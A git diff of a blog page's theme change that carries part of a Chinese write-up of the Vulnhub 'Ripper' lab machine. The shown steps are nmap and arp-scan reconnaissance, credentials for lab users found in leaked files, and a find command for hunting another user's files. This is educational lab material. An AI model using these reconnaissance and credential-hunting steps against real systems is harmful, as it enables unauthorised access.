@@ -1,23 +1,12 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang=zh>
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.0.0">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/icon_32.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/icon_16.png">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
-
-<script class="next-config" data-name="main" type="application/json">{"hostname":"hdfzzf.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
-<meta name="description" content="该靶机难度为中、低，涉及到了rips这个之前没有了解过的工具。">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="该靶机难度为中、低，涉及到了rips这个之前没有了解过的工具。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="15 Vulnhub Ripper Writeup">
 <meta property="og:url" content="https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/index.html">
@@ -56,286 +45,158 @@
 <meta property="article:tag" content="Webmin漏洞利用">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424153009.png">
-
-
-<link rel="canonical" href="https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/">
-
-
-
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/","path":"2022/04/24/15 Vulnhub Ripper Writeup/","title":"15 Vulnhub Ripper Writeup"}</script>
-
-<script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>15 Vulnhub Ripper Writeup | HDFZZF's BLOG</title>
-  
-
-
-
-
-
-  <noscript>
-    <link rel="stylesheet" href="/css/noscript.css">
-  </noscript>
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
-  <div class="headband"></div>
-  <a target="_blank" rel="noopener" href="https://github.com/hdfzzf" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
-
-  <main class="main">
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏" role="button">
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <i class="logo-line"></i>
-      <p class="site-title">HDFZZF's BLOG</p>
-      <i class="logo-line"></i>
-    </a>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
-        <i class="fa fa-search fa-fw fa-lg"></i>
-    </div>
-  </div>
-</div>
-
-
-
-<nav class="site-nav">
-  <ul class="main-menu menu">
-        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
-        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
-        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
-        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
-        </a>
-      </li>
-  </ul>
-</nav>
-
-
-
-  <div class="search-pop-overlay">
-    <div class="popup search-popup"><div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocapitalize="off" maxlength="80"
-           placeholder="搜索..." spellcheck="false"
-           type="search" class="search-input">
-  </div>
-  <span class="popup-btn-close" role="button">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div class="search-result-container no-result">
-  <div class="search-result-icon">
-    <i class="fa fa-spinner fa-pulse fa-5x"></i>
-  </div>
-</div>
-
-    </div>
-  </div>
-
-</div>
+    
+    
+      
         
-  
-  <div class="toggle sidebar-toggle" role="button">
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-  </div>
+          <link rel="shortcut icon" href="/images/LOGO.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>15 Vulnhub Ripper Writeup</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
 
-  <aside class="sidebar">
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
 
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
-      <ul class="sidebar-nav">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="الأعلى" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
       </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/04/26/GWCTF%202019%20%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/04/24/Zer0pts2020%20Can%20you%20guess%20it/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/&text=15 Vulnhub Ripper Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/&title=15 Vulnhub Ripper Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/&is_video=false&description=15 Vulnhub Ripper Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=15 Vulnhub Ripper Writeup&body=Check out this article: https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/&title=15 Vulnhub Ripper Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/&title=15 Vulnhub Ripper Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/&title=15 Vulnhub Ripper Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/&title=15 Vulnhub Ripper Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/&name=15 Vulnhub Ripper Writeup&description=&lt;p&gt;该靶机难度为中、低，涉及到了rips这个之前没有了解过的工具。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/&t=15 Vulnhub Ripper Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
 
-      <div class="sidebar-panel-container">
-        <!--noindex-->
-        <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-text">1. 靶机信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-text">2. 渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="nav-text">2.1. 主机发现、端口扫描、端口服务发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="nav-text">2.2. 访问http服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#get-shell"><span class="nav-text">2.3. get shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-text">2.4. 权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%BE%97cubes%E6%9D%83%E9%99%90"><span class="nav-text">2.4.1. 获得cubes权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%BE%97root%E6%9D%83%E9%99%90"><span class="nav-text">2.4.2. 获得root权限</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%951"><span class="nav-text">2.4.2.1. 方法1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%952"><span class="nav-text">2.4.2.2. 方法2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%953"><span class="nav-text">2.4.2.3. 方法3</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%95%AA%E5%A4%96"><span class="nav-text">2.4.3. 番外</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">3. 总结</span></a></li></ol></div>
-        </div>
-        <!--/noindex-->
-
-        <div class="site-overview-wrap sidebar-panel">
-          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="hdfzzf"
-      src="/images/zzf.jpg">
-  <p class="site-author-name" itemprop="name">hdfzzf</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap site-overview-item animated">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-        <a href="/archives/">
-          <span class="site-state-item-count">121</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-          <a href="/categories/">
-        <span class="site-state-item-count">13</span>
-        <span class="site-state-item-name">分类</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-          <a href="/tags/">
-        <span class="site-state-item-count">194</span>
-        <span class="site-state-item-name">标签</span></a>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author site-overview-item animated">
-      <span class="links-of-author-item">
-        <a href="https://github.com/hdfzzf" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;hdfzzf" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="mailto:dfhong1998@163.com" title="E-Mail → mailto:dfhong1998@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
-      </span>
-  </div>
-
-
-
-        </div>
-      </div>
     </div>
-  </aside>
-  <div class="sidebar-dimmer"></div>
-
-
-    </header>
-
-    
-  <div class="back-to-top" role="button" aria-label="返回顶部">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-  <div class="reading-progress-bar"></div>
-
-<noscript>
-  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
-</noscript>
-
-
-    <div class="main-inner post posts-expand">
-
-
-  
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/zzf.jpg">
-      <meta itemprop="name" content="hdfzzf">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="HDFZZF's BLOG">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          15 Vulnhub Ripper Writeup
-        </h1>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-04-24 00:00" itemprop="dateCreated datePublished" datetime="2022-04-24T00:00:00+08:00">2022-04-24</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-04-26 15:21" itemprop="dateModified" datetime="2022-04-26T15:21:33+08:00">2022-04-26</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a>
-        </span>
-    </span>
-
-  
-    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-eye"></i>
-      </span>
-      <span class="post-meta-item-text">阅读次数：</span>
-      <span id="busuanzi_value_page_pv"></span>
-    </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus：</span>
-    
-    <a title="disqus" href="/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2022/04/24/15 Vulnhub Ripper Writeup/" itemprop="commentCount"></span>
-    </a>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">2. 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. 访问http服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.4.</span> <span class="toc-text">2.4. 权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97cubes%E6%9D%83%E9%99%90"><span class="toc-number">2.4.1.</span> <span class="toc-text">2.4.1. 获得cubes权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97root%E6%9D%83%E9%99%90"><span class="toc-number">2.4.2.</span> <span class="toc-text">2.4.2. 获得root权限</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%951"><span class="toc-number">2.4.2.1.</span> <span class="toc-text">2.4.2.1. 方法1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%952"><span class="toc-number">2.4.2.2.</span> <span class="toc-text">2.4.2.2. 方法2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%953"><span class="toc-number">2.4.2.3.</span> <span class="toc-text">2.4.2.3. 方法3</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%AA%E5%A4%96"><span class="toc-number">2.4.3.</span> <span class="toc-text">2.4.3. 番外</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">3. 总结</span></a></li></ol>
+    </div>
   </span>
-  
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>3.7k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>3 分钟</span>
-    </span>
 </div>
 
-        </div>
-      </header>
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        15 Vulnhub Ripper Writeup
+    </h1>
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-        <p>该靶机难度为中、低，涉及到了rips这个之前没有了解过的工具。</p>
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hdfzzf</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-04-23T16:00:00.000Z" itemprop="datePublished">2022-04-24</time>
+        
+        (Updated: <time datetime="2022-04-26T07:21:33.128Z" itemprop="dateModified">2022-04-26</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CVE-2021-3493/" rel="tag">CVE-2021-3493</a>, <a class="tag-link-link" href="/tags/Webmin%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="tag">Webmin漏洞利用</a>, <a class="tag-link-link" href="/tags/rips%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">rips代码审计</a>, <a class="tag-link-link" href="/tags/vulnhub/" rel="tag">vulnhub</a>, <a class="tag-link-link" href="/tags/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E6%B3%84%E5%AF%86/" rel="tag">备份文件泄密</a>, <a class="tag-link-link" href="/tags/%E7%BB%BC%E5%90%88/" rel="tag">综合</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>该靶机难度为中、低，涉及到了rips这个之前没有了解过的工具。</p>
 <span id="more"></span>
 <h1 id="靶机信息">1. 靶机信息</h1>
 <p>靶机地址：</p>
@@ -373,7 +234,9 @@
 <h1 id="渗透">2. 渗透</h1>
 <p>kali: 10.0.2.4</p>
 <h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.23</span><br><span class="line">sudo nmap -p22,80,10000 -sV 10.0.2.23</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> arp-scan -l
+<span class="token function">sudo</span> nmap -p- <span class="token number">10.0</span>.2.23
+<span class="token function">sudo</span> nmap -p22,80,10000 -sV <span class="token number">10.0</span>.2.23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424153009.png" /></p>
 <p>收集信息：</p>
 <ul>
@@ -406,39 +269,78 @@
 <p>发现了一个<code>secret.php</code>文件，这名字一看就隐藏着密码。</p>
 <p>其实也可以同通过下图中的file功能列出扫描的所有php文件</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424154708.png" /></p>
-<p>该文件中的信息如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user name: ripper</span><br><span class="line">pass: Gamespeopleplay</span><br></pre></td></tr></table></figure></p>
+<p>该文件中的信息如下： <pre class="line-numbers language-none"><code class="language-none">user name: ripper
+pass: Gamespeopleplay<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
 <p>起初还以为这是10000端口的登录账号和密码，但是尝试过后发现并不是。因此目前只有ssh需要密码。</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424155132.png" /></p>
 <h2 id="权限提升">2.4. 权限提升</h2>
 <h3 id="获得cubes权限">2.4.1. 获得cubes权限</h3>
 <p>发现/home目录下除了ripper之外，存在着另一个用户cubes。那么接下来可能就是需要先拿到cubes的权限，然后再拿到root权限。</p>
-<p>经过信息收集发现之前的一些提权手段都没法使用。接下来可以使用下面的命令找到属主是cubes但是ripper可读的文件。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user cubes -<span class="built_in">type</span> f -<span class="built_in">exec</span> ls -la &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
+<p>经过信息收集发现之前的一些提权手段都没法使用。接下来可以使用下面的命令找到属主是cubes但是ripper可读的文件。 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / -user cubes -type f -exec <span class="token function">ls</span> -la <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424155612.png" /></p>
-<p>又发现了一个secret.file文件，直接查看该文件，文件内容如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">This is my secret file</span><br><span class="line"></span><br><span class="line">[file system]</span><br><span class="line">-passwd : Il00tpeople</span><br></pre></td></tr></table></figure></p>
